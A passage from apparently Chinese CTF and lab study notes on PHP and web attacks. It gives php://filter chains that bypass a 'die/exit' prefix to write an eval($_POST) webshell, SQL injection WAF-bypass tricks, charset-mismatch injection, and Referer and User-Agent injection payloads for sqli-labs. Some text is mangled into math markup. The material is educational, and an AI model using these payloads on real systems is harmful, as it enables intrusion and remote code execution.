$content);</span><br></pre></td></tr></table></figure>\n<p>$content 在开头增加了 exit 过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上 if (!defined (xxx)) exit; 之类的限制）</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>是可以控制协议的，我们即可使用</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>协议</mtext><mo separator=\"true\">,</mo><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>流的</mtext><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn><mo>−</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mtext>方法，将</mtext></mrow><annotation encoding=\"application/x-tex\">_POST[&#x27;filename&#x27;]是可以控制协议的，我们即可使用 php://filter协议,php://filter流的base64-decode方法，将</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">制</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">方</span><span class=\"mord cjk_fallback\">法</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">将</span></span></span></span> content 解码，利用 php base64_decode 函数特性去除 “死亡 exit”。</p>\n<p>因此我们可以找到两种 base64-decode 相关的绕过</p>\n<p>0x00 通过 base64 编码特性绕过</p>\n<p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 $content 被加上了 <code>&lt;?php exit; ?&gt;</code>  以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。由于该语句中只有 phpexit 符合 base64 解码特性，因此其余的符号会被忽略。</p>\n<p>“phpexit” 一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个 “a” 一共 8 个字符。后面在拼接我们一句话木马的 base64 编码格式。这样在解码的时候 phpexita 会被解码为无用字符，我们的一句话木马被正常解码</p>\n<p>因此我们最终传入的 payload 为：</p>\n<p><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/read=convert.base64-decode/resource=aaa.php</code></p>\n<p>在 filename 解码时，a 和 phpexit 变为了乱码，我们的 eval ($_POST [1]) 最终留了下来</p>\n<p>0x01 利用字符串操作</p>\n<p><code>&lt;?php exit; ?&gt;</code>  实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>利用如下 payload，我们便能去除 &lt;&gt; 中的内容  <code>php://filter/read=string.strip_tags/resource=php://input</code></p>\n<p>但问题在于，如果我们去除 &lt;&gt; 会导致我们的一句话木马也被去除。</p>\n<p>但 php://filter 允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 strip_tags 后再进行 base64-decode。</p>\n<p>最终 payload 如下</p>\n<p><code>txt=PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/write=string.strip_tags | convert.base64-decode/resource=aaa.php</code></p>\n<p>filename 中的 string.strip_tags 先把 exit 的 &lt;&gt; 去除，在把我们提交的 base64 编码解码，最终只剩下 <code>&lt;?php eval($_POST[1];?)</code></p>\n<h5 id=\"带有waf过滤的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#带有waf过滤的sql注入\">#</a> 带有 WAF 过滤的 SQL 注入</h5>\n<p>1. 过滤 and、or</p>\n<p>在过滤一遍的场景下可以尝试双写，大小写  less25，26</p>\n<p>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</p>\n<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>\n<p>2. 过滤空格</p>\n<p>使用 /**/ 多行注释代替  Less 26</p>\n<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>\n<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>3. 过滤注释</p>\n<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>\n<p>使用；%00 截断</p>\n<p>4.union select 过滤</p>\n<p>uniunion selecton select</p>\n<p>5. 过滤 =</p>\n<p>like</p>\n<p>regexp</p>\n<p>6.0x 通过 16 进制逃过</p>\n<h5 id=\"通过编码注入\"><a class=\"markdownIt-Anchor\" href=\"#通过编码注入\">#</a> 通过编码注入</h5>\n<ol>\n<li></li>\n</ol>\n<p>一些 mysql 不认识，但 php 认识的字符，只限制于 post</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_select_db</span>(<span class=\"string\">&#x27;adog&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;set names utf8&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$ps</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;select * from users where id=&#x27;<span class=\"subst\">$id</span>&#x27; and ps=&#x27;<span class=\"subst\">$ps</span>&#x27;&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$id</span> == <span class=\"string\">&#x27;adog&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shabi&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">flag</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_select_db</span>(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"string\">&quot;set names utf-8&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"number\">256</span>;<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"string\">&quot;hehe&quot;</span>.<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `demo` where `name`=`<span class=\"subst\">&#123;$name&#125;</span>`&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"string\">&quot;hehe&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">&#123;$c&#125;</span> &lt;br/&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述脚本，我么可以查到一些 latin1 的单词，来绕过，比如 <code>Å</code></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>一些通过 get 提交，mysql 不认识，但 php 认识的字符，限制于 get</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class=\"string\">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Permission denied!&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM z_users where username = &#x27;<span class=\"subst\">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class=\"subst\">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>大概内容就是 username=admin 时会直接 die，不是 admin 但又查不出东西</p>\n<p>mysql 默认字符集为 latin1，根本原因为 mysql 字符集和 mysqli 客户端字符集不同。我们通过语句 <code>mysql_query(&quot;set names utf-8&quot;);</code>  , <code>set names utf8</code>  的意思是将客户端的字符集设置为 utf8。mysql 有如下几种 charset</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &quot;%character%&quot;;</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                                    |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8                                     |</span><br><span class=\"line\">| character_set_connection | utf8                                     |</span><br><span class=\"line\">| character_set_database   | gbk                                      |</span><br><span class=\"line\">| character_set_filesystem | binary                                   |</span><br><span class=\"line\">| character_set_results    | utf8                                     |</span><br><span class=\"line\">| character_set_server     | utf8                                     |</span><br><span class=\"line\">| character_set_system     | utf8                                     |</span><br><span class=\"line\">| character_sets_dir       | D:\\BtSoft\\mysql\\MySQL5.5\\share\\charsets\\ |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">8 rows in set (0.04 sec)</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，mysql 字符集为 latin1，而执行了 <code>set names utf8;</code>  以后， <code>character_set_client</code> 、 <code>character_set_connection</code> 、 <code>character_set_results</code>  等与客户端相关的配置字符集都变成了 utf8，但 <code>character_set_database</code> 、 <code>character_set_server</code>  等服务端相关的字符集还是 latin1。</p>\n<p>因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql 在执行查询的时候，就涉及到字符集的转换。</p>\n<ol>\n<li>MySQL Server 收到请求时将请求数据从 character_set_client 转换为 character_set_connection；</li>\n<li>进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集</li>\n</ol>\n<p><code>character_set_client</code>  和 <code>character_set_connection</code>  被设置成了 utf8，而 <code>内部操作字符集</code> 其实也就是 <code>username</code>  字段的字符集还是默认的 latin1。于是，整个操作就有如下字符串转换过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>\n<p>最后执行比较 <code>username='admin'</code>  的时候， <code>'admin'</code>  是一个 latin1 字符串。</p>\n<p>因此对于以下 url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:9090/test.php?username=admin%e4</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd%ac</span><br></pre></td></tr></table></figure>\n<p>前两个可以正常查询，但最后一个会产生错误，并且 url 中从 <code>%e4%bd%ac</code>  变为了 <code>佬</code></p>\n<p>在输入 % e4,% e4% bd 时，因为 utf8 是三个字节，他不认识这个两个字节和一个字节的玩意，自动忽略，扔给 latin1 时还是 admin，因此服务端正常查询</p>\n<p>一但 % e4% bd% ac 输入完整后，这三个字节拼成了佬，现在 utf8 认识了，传给服务端的时候变成了 admin 佬，现在 latin1 不认识了，开始报错</p>\n<p>这就是这三个前两个可以正常查询，但第三个报错的原因</p>\n<p>继续查询，我们发现只有部分字符可以正常查询出结果，但有些不能</p>\n<p>比如 admin% c2 可以，但 admin% c1 就不行，经过师傅的测试，有如下结果</p>\n<blockquote>\n<ol>\n<li>\\x00 <code>~</code> \\x7F`： 返回空白结果</li>\n<li><code>\\x80</code> ~ <code>\\xC1</code> ： 返回错误 Illegal mix of collations</li>\n<li><code>\\xC2</code> ~ <code>\\xEF</code> ： 返回 admin 的结果</li>\n<li><code>\\xF0</code> ~ <code>\\xFF</code> ： 返回错误 Illegal mix of collations</li>\n</ol>\n</blockquote>\n<p>UTF-8 编码是变长编码，可能有 1~4 个字节表示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022172222480.png\" alt=\"image-20221022172222480\"></p>\n<p>然后根据 RFC 3629 规范，又有一些字节值是不允许出现在 UTF-8 编码中的：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db28c7b4-4dc9-4592-9fc7-23f0290c3892.6e734d61aa73.jpg\" alt=\"14917445720884.jpg\"></p>\n<p>所以最终，UTF-8 第一字节的取值范围是：00-7F、C2-F4，这也是我在 admin 后面加上 80-C1、F5-FF 等字符时会抛出错误的原因。</p>\n<p>那么，为什么 <code>username=admin%F0</code>  也不行呢？F0 是在 C2-F4 的范围中呀？</p>\n<p>这又涉及到 Mysql 中另一个特性：<strong>Mysql 的 utf8 其实是阉割版 utf-8 编码，Mysql 中的 utf8 字符集最长只支持三个字节</strong>，</p>\n<p>F0-F4 是四字节才有的，所以我传入 <code>username=admin%F0</code>  也将抛出错误。</p>\n<p>如果你需要 Mysql 支持四字节的 utf-8，可以使用 <code>utf8mb4</code>  编码。我将原始代码中的 set names 改成 <code>set names utf8mb4</code> ，就可以正常查询了</p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于php和mysql之间的编码问题，post和get方法是不一样的，post不用URL编码，可以直接用latin文字绕过</span><br><span class=\"line\">get需要利用到mysql字符集之间的转换，同时还要对utf8的字节范围熟悉，这样在utf8-utf9-latin1时就可以利用编码转换逃逸了</span><br><span class=\"line\">同时注意mysql的utf8是三个字节的，要是想用f0-f4需要把编码变为utf8mb4</span><br><span class=\"line\">utf8mb4是个好东西，还能防宽字节，下面会有详细描述</span><br></pre></td></tr></table></figure>\n<p>参考 p 师傅博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20=\">https://www.leavesongs.com</span></p>\n<h5 id=\"referer注入\"><a class=\"markdownIt-Anchor\" href=\"#referer注入\">#</a> referer 注入</h5>\n<p>通过 referer 字段不严格的过滤产生注入</p>\n<p>phpcmsv9 存在 referer 注入</p>\n<p>sqllab pass-19</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png\" alt=\"image-20220311175006708\"></p>\n<p>通过闭合确定 referer 存在注入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>构造如下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1),&#x27;127.0.0.100&#x27;)#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>注意题目源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class=\"line\">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>\n<h5 id=\"user-agent注入\"><a class=\"markdownIt-Anchor\" href=\"#user-agent注入\">#</a> user-agent 注入</h5>\n<p>参考 sqllab 第 18 关</p>\n<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>\n<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>\n<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">value = stripslashes(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_input($value)</span><br><span 